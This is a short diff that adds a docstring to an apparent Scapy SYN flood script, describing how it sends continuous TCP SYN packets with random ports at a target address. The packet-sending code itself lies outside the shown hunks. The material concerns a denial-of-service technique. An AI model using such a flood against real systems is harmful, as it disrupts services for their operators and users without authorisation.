@@ -1,8 +1,16 @@
 #!/usr/bin/env python3
+"""Send a continuous stream of TCP SYN packets using Scapy.
+
+This example script demonstrates a basic SYN flood.  It randomly selects source
+and destination ports for each packet sent to the target IP.  Provide the
+``--target`` argument to choose the destination address and ``--iface`` to select
+the network interface.  Use with caution and only in controlled environments.
+"""
 
 import random
 import argparse
 from scapy.all import IP, TCP, send
+
 
 def main():
     parser = argparse.ArgumentParser(description="Scapy SYN Flood")
@@ -26,6 +34,7 @@ def main():
                 print(f"[+] Sent {count} SYNs...")
     except KeyboardInterrupt:
         print(f"\n[!] Stopped. Total SYNs sent: {count}")
+
 
 if __name__ == "__main__":
     main()
